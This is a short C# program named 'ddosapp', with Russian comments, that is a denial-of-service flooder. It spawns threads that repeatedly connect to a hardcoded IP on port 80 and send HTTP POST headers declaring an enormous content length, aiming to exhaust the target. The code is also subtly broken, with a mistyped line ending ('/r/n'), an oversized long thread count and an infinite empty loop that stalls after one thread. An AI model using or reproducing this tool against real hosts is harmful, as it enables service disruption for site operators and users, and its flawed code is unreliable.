using System.Net.Sockets;
using System.Threading;
using System.IO;

namespace ddosapp
{
    internal class Program
    {
        static void Main(string[] args)
        {
            string target = "192.168.1.1"; // хост цель
            int port = 80; // цель порт
            long threads = 9000000000000000000; // число нитей

            for(int i = 0; i < threads; i++)
            {
                new Thread(() =>
                {
                    Thread.CurrentThread.IsBackground = true;
                    while (true)
                    {
                        try
                        {
                            TcpClient client = new TcpClient();
                            client.NoDelay = true;
                            client.Connect(target, port); // подключение
                            StreamWriter stream = new StreamWriter(client.GetStream());
                            stream.Write("POST / HTTP/1.1/r/nHost: " + target + "\r\nContent-length: 9000000000000000000\r\n\r\n"); // отправка пакетов
                            stream.Flush();
                            client.Close();
                        }
                        catch
                        {
                            // !!
                        }

                    }
                }).Start();
                while (true) ;
                // ожидание
            }
        }
    }
}
